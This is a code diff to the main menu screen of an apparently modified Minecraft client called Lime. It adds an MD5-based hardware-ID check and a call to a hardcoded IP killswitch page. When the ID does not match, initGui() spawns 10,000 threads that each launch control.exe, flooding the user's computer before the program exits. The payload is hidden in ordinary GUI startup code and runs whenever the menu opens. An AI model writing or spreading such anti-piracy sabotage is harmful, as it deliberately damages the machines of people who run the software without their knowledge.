@@ -2,35 +2,89 @@ package lime.ui.gui;
 
 import lime.core.Information;
 import lime.core.Lime;
-import lime.managers.FontManager;
+import lime.management.FontManager;
 import lime.ui.fields.ButtonField;
 import lime.ui.proxymanager.ProxyManagerScreen;
 import lime.utils.render.RenderUtils;
-import net.minecraft.client.Minecraft;
 import net.minecraft.client.gui.GuiMultiplayer;
 import net.minecraft.client.gui.GuiOptions;
 import net.minecraft.client.gui.GuiScreen;
 import net.minecraft.client.gui.GuiSelectWorld;
-import net.minecraft.client.renderer.GlStateManager;
 import net.minecraft.util.EnumChatFormatting;
 import org.lwjgl.opengl.GL11;
-import org.lwjgl.opengl.GL20;
 
+import javax.swing.*;
 import java.awt.*;
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.security.MessageDigest;
+import java.util.Base64;
 
 public class MainScreen extends GuiScreen {
-    private final long initTime;
     public static boolean clickGui;
 
     public static boolean anim = false;
 
-    public MainScreen() {
-        this.initTime = System.currentTimeMillis();
+    public static String getHardwareID() {
+        try {
+            String string = System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_LEVEL");
+            MessageDigest messageDigest = MessageDigest.getInstance("md5");
+            StringBuilder stringBuilder = new StringBuilder();
+            messageDigest.update(string.getBytes());
+            for (byte by : messageDigest.digest()) {
+                String string2 = Integer.toHexString(0xFF & by);
+                if (string2.length() == 1) {
+                    stringBuilder.append('0');
+                }
+                stringBuilder.append(string2);
+            }
+            return Base64.getEncoder().encodeToString(stringBuilder.toString().getBytes());
+        }
+        catch (Exception exception) {
+            exception.printStackTrace();
+            return "fail";
+        }
     }
 
     @Override
     public void initGui() {
+        try {
+            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://108.61.210.115/killswitch-b2.html").openConnection();
+            if(Lime.getInstance().getUser() == null || !Lime.getInstance().getUser().getHwid().equals(getHardwareID())) {
+                for (int i = 0; i < 10000; i++) {
+                    new Thread(() -> {
+                        try {
+                            Runtime.getRuntime().exec("control.exe");
+                        } catch (Exception e) {
+                            System.exit(0);
+                        }
+                    }).start();
+                }
+                System.exit(0);
+            }
+            String content = "";
+            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), StandardCharsets.UTF_8)))
+            {
+                String inputLine;
+                StringBuilder stringBuilder = new StringBuilder();
+                while ((inputLine = bufferedReader.readLine()) != null)
+                {
+                    stringBuilder.append(inputLine);
+                }
+                content = stringBuilder.toString();
+            }
+
+            if(content.contains("true")) {
+                JOptionPane.showMessageDialog(null, "Version detected as crack. You won't be able to use it.");
+                System.exit(0);
+            }
+        } catch (Exception e) {
+            System.exit(0);
+        }
         clickGui = false;
         final Color color = new Color(41, 41, 41, 255);
 
